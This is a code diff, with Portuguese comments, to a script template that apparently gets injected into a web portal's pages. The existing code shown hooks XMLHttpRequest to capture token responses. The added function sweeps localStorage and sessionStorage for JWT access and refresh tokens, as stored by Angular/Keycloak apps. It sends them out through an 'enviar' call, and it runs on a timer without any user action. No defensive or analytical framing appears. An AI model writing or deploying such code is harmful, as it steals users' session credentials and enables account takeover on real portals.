@@ -105,6 +105,27 @@ function scriptTexto(segredo, endpoint) {
     try { if (ehEndpointToken(this.__cmpUrl)) { var self = this, reqBody = body; this.addEventListener('load', function () { try { if (self.status >= 200 && self.status < 300) daRespostaToken(self.__cmpUrl, reqBody, self.responseText); } catch (e) {} }); } } catch (e) {}
     return oSend.apply(this, arguments);
   };
+  // varre o armazenamento do portal (localStorage/sessionStorage): apps Angular/
+  // Keycloak guardam access_token + refresh_token ali — pega o refresh mesmo sem clique.
+  function varrerStorage() {
+    try {
+      [window.localStorage, window.sessionStorage].forEach(function (st) {
+        if (!st) return;
+        try { var at = st.getItem('access_token'), rt = st.getItem('refresh_token'); if (at && at.split('.').length === 3) { var pl = { token: at }; if (rt) pl.refresh_token = rt; enviar(pl); } } catch (e) {}
+        for (var i = 0; i < st.length; i++) {
+          try {
+            var v = st.getItem(st.key(i));
+            if (v && v.indexOf('refresh_token') > -1 && v.indexOf('access_token') > -1) {
+              var o = JSON.parse(v);
+              if (o && o.access_token && String(o.access_token).split('.').length === 3) { var pl2 = { token: o.access_token }; if (o.refresh_token) pl2.refresh_token = o.refresh_token; enviar(pl2); }
+            }
+          } catch (e) {}
+        }
+      });
+    } catch (e) {}
+  }
+  setTimeout(varrerStorage, 4000);
+  setInterval(varrerStorage, 90000);
 })();
 `
 }
